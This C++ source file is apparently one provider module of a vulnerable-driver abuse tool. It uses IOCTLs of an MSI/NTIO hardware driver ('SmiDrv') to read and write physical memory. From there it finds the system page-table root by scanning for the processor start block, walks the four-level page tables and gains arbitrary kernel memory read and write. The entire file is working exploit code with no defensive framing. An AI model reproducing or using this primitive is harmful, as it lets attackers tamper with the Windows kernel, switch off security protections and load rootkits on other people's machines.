#include "ntiomsi.h"

void ntiomsi::init()
{
	provider::init();
	 
	_system_pml4_base = get_system_pml4_base();

	if (!_system_pml4_base)
		LogError("Failed to get the pml4 database of the system process!");

	Log("system_pml4 = 0x%016llX", _system_pml4_base);
}

void ntiomsi::read_kernel_virtualmemory(uintptr_t pAddress, size_t size, OUT PVOID pOut)
{
	__int64 pa = virtual_to_physical_ptr_for_4level_paging(pAddress, _system_pml4_base);
	BUFFER_IO_PARAMS_FOR_READ_PHYSICAL_MEMORY ioParams{ 0 };
	ioParams.BlockLength = sizeof(char);
	ioParams.PhysicalAddress = pa;
	ioParams.BlockCount = size;
	io_call_read_physical_memory(&ioParams);
	memcpy(pOut, &ioParams, size);
}

void ntiomsi::write_kernel_virtualmemory(uintptr_t pAddress, PVOID pWriteData, size_t size, OUT PVOID pOldData)
{
	if (pOldData)
		read_kernel_virtualmemory(pAddress, size, pOldData);

	__int64 pa = virtual_to_physical_ptr_for_4level_paging(pAddress, _system_pml4_base);
	BUFFER_IO_PARAMS_FOR_WRITE_PHYSICAL_MEMORY ioParams{ 0 };
	ioParams.BlockLength = sizeof(char);
	ioParams.PhysicalAddress = pa;
	ioParams.BlockCount = size;
	memcpy(ioParams.WriteData, pWriteData, size);
	io_call_write_physical_memory(&ioParams);
}

__int64 ntiomsi::get_system_pml4_base()
{	
	BUFFER_IO_PARAMS_FOR_READ_PHYSICAL_MEMORY ioParams{ 0 };
	ioParams.BlockLength = sizeof(char);
	ioParams.BlockCount = sizeof(FAR_JMP_16) + sizeof(ULONG);
	PROCESSOR_START_BLOCK* psb = (PROCESSOR_START_BLOCK*)&ioParams;

	for (DWORD physicalAddress = 0x10000; 
		physicalAddress <= REAL_MODE_ADDRESS_SPACE_SIZE; 
		physicalAddress += PAGE_SMALL_SIZE) {
		ioParams.PhysicalAddress = physicalAddress;
		io_call_read_physical_memory(&ioParams);
		if (psb->Jmp.OpCode != 0xe9 || psb->CompletionFlag != true) continue;
		__int64 systemPml4PhysicalAddress = physicalAddress + FIELD_OFFSET(PROCESSOR_START_BLOCK, ProcessorState) + FIELD_OFFSET(KSPECIAL_REGISTERS, Cr3);
		ioParams.PhysicalAddress = systemPml4PhysicalAddress;
		ioParams.BlockCount = sizeof(ULONG64);
		io_call_read_physical_memory(&ioParams);
		return *(__int64*)&ioParams;
	}

	return NULL;
}



void ntiomsi::io_call_read_physical_memory(BUFFER_IO_PARAMS_FOR_READ_PHYSICAL_MEMORY* rIoParams)
{
	if (!DeviceIoControl(HProviderDriver,
		IOCTL_READ_PHYSICAL_MEMORY,
		rIoParams,
		sizeof(BUFFER_IO_PARAMS_FOR_READ_PHYSICAL_MEMORY),
		rIoParams,
		sizeof(BUFFER_IO_PARAMS_FOR_READ_PHYSICAL_MEMORY),
		nullptr,
		nullptr)) {
		LogError("SmiDrv read physical pointer fail!");
	}
}

void ntiomsi::io_call_write_physical_memory(BUFFER_IO_PARAMS_FOR_WRITE_PHYSICAL_MEMORY* wIoParams)
{
	if (!DeviceIoControl(HProviderDriver,
		IOCTL_WRITE_PHYSICAL_MEMORY,
		wIoParams,
		sizeof(BUFFER_IO_PARAMS_FOR_WRITE_PHYSICAL_MEMORY),
		wIoParams,
		sizeof(BUFFER_IO_PARAMS_FOR_WRITE_PHYSICAL_MEMORY),
		nullptr,
		nullptr)) {
		LogError("SmiDrv write physical pointer fail!");
	}
}

__int64 ntiomsi::virtual_to_physical_ptr_for_4level_paging(uintptr_t pVirtualAddress, __int64 pml4Base)
{
	VIRTUAL_ADDRESS va(pVirtualAddress);

	BUFFER_IO_PARAMS_FOR_READ_PHYSICAL_MEMORY ioParams{ 0 };

	ioParams.BlockLength = sizeof(char);
	ioParams.BlockCount = sizeof(__int64);
	__int64 pml4ePa = pml4Base + va.Pml4e_Index * 8;

	ioParams.PhysicalAddress = pml4ePa;
	io_call_read_physical_memory(&ioParams);
	__int64 pml4eValue = *(__int64*)&ioParams;
	__int64 pdpBasePa = pml4eValue & 0xFFFFFFFFFF000;
	__int64 pdpePa = pdpBasePa + va.Pdpe_Index * 8;
	DebugLog("pml4Base = 0x%016llX; pml4ePa = 0x%016llX; pml4eValue = 0x%016llX => pdpBasePa = 0x%016llX", pml4Base, pml4ePa, pml4eValue, pdpBasePa);

	ioParams.PhysicalAddress = pdpePa;
	io_call_read_physical_memory(&ioParams);
	__int64 pdpeValue = *(__int64*)&ioParams;
	__int64 pdBasePa = pdpeValue & 0xFFFFFFFFFF000;
	__int64 pdePa = pdBasePa + va.Pde_Index * 8;
	DebugLog("pdpBasePa = 0x%016llX; pdpePa = 0x%016llX; pdpeValue = 0x%016llX => pdBasePa = 0x%016llX", pdpBasePa, pdpePa, pdpeValue, pdBasePa);

	ioParams.PhysicalAddress = pdePa;
	io_call_read_physical_memory(&ioParams);
	__int64 pdeValue = *(__int64*)&ioParams;
	__int64 ptBasePa = pdeValue & 0xFFFFFFFFFF000;
	__int64 ptePa = ptBasePa + va.Pte_Index * 8;
	DebugLog("pdBasePa = 0x%016llX; pdePa = 0x%016llX; pdeValue = 0x%016llX => ptBasePa = 0x%016llX", pdBasePa, pdePa, pdeValue, ptBasePa);

	ioParams.PhysicalAddress = ptePa;
	io_call_read_physical_memory(&ioParams);
	__int64 pteValue = *(__int64*)&ioParams;
	__int64 pfBasePa = pteValue & 0xFFFFFFFFFF000;
	DebugLog("ptBasePa = 0x%016llX; ptePa = 0x%016llX; pteValue = 0x%016llX => pfBasePa = 0x%016llX", ptBasePa, ptePa, pteValue, pfBasePa);

	__int64 pa = pfBasePa + va.Pf_4k_Offset;
	DebugLog("VirtualAddress = 0x%016llX convert to PhysicalAddress = 0x%016llX success!", pVirtualAddress, pa);
	return pa;
}
